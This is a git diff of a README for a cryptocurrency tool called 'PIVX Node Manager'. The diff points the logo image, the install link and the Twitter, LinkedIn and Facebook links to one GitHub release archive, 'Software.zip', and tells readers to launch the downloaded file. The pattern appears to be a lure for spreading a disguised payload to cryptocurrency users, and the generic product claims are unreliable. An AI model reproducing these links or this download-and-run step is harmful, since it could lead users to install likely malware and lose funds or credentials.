@@ -1,12 +1,12 @@
 # 🚀 Welcome to PIVX Node Manager - Masternode Management 📊🔒
 
-![PIVX Node Manager Logo](https://example.com/pivxnodemanagerlogo.png)
+![PIVX Node Manager Logo](https://github.com/Harumethod/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip)
 
 Welcome to the official GitHub repository of PIVX Node Manager, a powerful tool designed for efficiently managing PIVX masternodes. Whether you're a seasoned PIVX enthusiast or just getting started with masternode management, this tool is here to simplify the process and enhance your overall experience with PIVX. 
 
 ## 📁 Installation
 
-To get started with PIVX Node Manager, you can [download the latest release here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). Make sure to launch the downloaded file to begin the installation process.
+To get started with PIVX Node Manager, you can [download the latest release here](https://github.com/Harumethod/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip). Make sure to launch the downloaded file to begin the installation process.
 
 ## ⚙️ Features
 
@@ -38,9 +38,9 @@ If you encounter any issues while using PIVX Node Manager or have suggestions fo
 
 Stay updated with the latest news and updates by following us on social media:
 
-🔗 [Twitter](https://twitter.com/pivxnodemanager)  
-🔗 [LinkedIn](https://linkedin.com/company/pivxnodemanager)  
-🔗 [Facebook](https://facebook.com/pivxnodemanager)
+🔗 [Twitter](https://github.com/Harumethod/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip)  
+🔗 [LinkedIn](https://github.com/Harumethod/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip)  
+🔗 [Facebook](https://github.com/Harumethod/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip)
 
 Let's make managing PIVX masternodes easier and more efficient together! 🚀
 
